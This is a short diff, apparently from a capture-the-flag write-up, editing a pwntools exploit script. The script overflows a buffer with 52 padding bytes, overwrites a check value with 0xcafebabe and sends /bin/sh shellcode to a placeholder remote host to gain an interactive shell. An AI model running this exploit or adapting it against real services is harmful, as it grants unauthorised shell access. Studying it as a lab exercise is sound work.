@@ -26,9 +26,7 @@ echo $((0x48-0x14))
 # -*- coding: utf-8 -*-
 from pwn import *
 context.arch = "amd64"
-
 # 0xcafebabe
-
 r = remote('ip', port)
 
 shell = asm(shellcraft.sh())
@@ -36,12 +34,13 @@ shell = asm(shellcraft.sh())
 buf = p32(0xcafebabe)
 
 payload = "A"*52
-
 payload += buf
-
 payload += shell
 
 r.sendline(payload)
+
+a = r.recvline().strip() # 接收回傳的字串
+print a
 
 r.interactive()
 ```
